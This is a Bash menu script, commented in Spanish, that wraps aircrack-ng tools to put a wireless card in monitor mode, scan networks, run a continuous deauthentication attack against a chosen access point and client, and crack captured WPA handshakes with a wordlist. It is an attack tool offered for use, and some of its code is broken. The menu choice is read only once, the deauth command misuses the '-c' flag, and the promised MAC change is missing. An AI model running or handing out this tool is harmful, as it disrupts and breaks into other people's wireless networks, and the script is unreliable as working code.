#!/bin/bash

clear
figlet "FrankoSav"
echo "Elegí una opción:"
echo "1. Iniciar Modo Monitor y Cambiar MAC"
echo "2. Detener Modo Monitor"
echo "3. Escanear Redes"
echo "4. Atack Deauth"
echo "5. Crackear Handshake"
echo "6. Escanear Red Especifica"
echo "7. Salir"
read -p "Opcion: " opcion

while true; do
  case $opcion in
    1)
      # Mon mode on and changed mac
      sudo airmon-ng start wlan0
      sudo airmon-ng check kill

      read -p "Enter para volver al menú"
      ;;
    2)
      # Mon mode off
      sudo airmon-ng stop wlan0
      /etc/init.d/networking restart

      read -p "Enter para volver al menú"
      ;;
    3)
      # Scan with interface
      sudo airodump-ng wlan0

      read -p "Enter para volver al menú"
      ;;
    4)
      # Deauth attack
      read -p "Ingrese el número de canal a utilizar: " channel
      read -p "MAC del ACCES POINT objetivo: " mac_ap
      read -p "MAC del cliente objetivo: " mac_cliente
      aireplay-ng --deauth 0 -c $channel -a $mac_ap -c $mac_cliente wlan0

      read -p "Enter para volver al menú"
      ;;
     5)
      # Enter handshake file
      read -p "Ingresa la ruta del archivo handshake: " handshake_file
            
      # Enter wordlist for bruteforce
      read -p "Ingresa la ruta del diccionario a usar: " wordlist_file
            
      # Cracking Handshake
      aircrack-ng $handshake_file -w $wordlist_file
            
            read -p "Enter para volver al menú"
      ;;
     6)
      # Escaneo de red especifica puede ser por filtrado de ESSID o BSSID
      read -p "Ingrese el número de canal a utilizar: " channel
      read -p "ESSID De la red para escanear: " essid
      airodump-ng -c $channel --essid $essid wlan0
      
      read -p "Enter para volver al menú"
      ;;
     7)
      # Exit
      break
      ;;
    *)
      echo "Opción inválida, por favor seleccione una opción válida"
      ;;
  esac
done

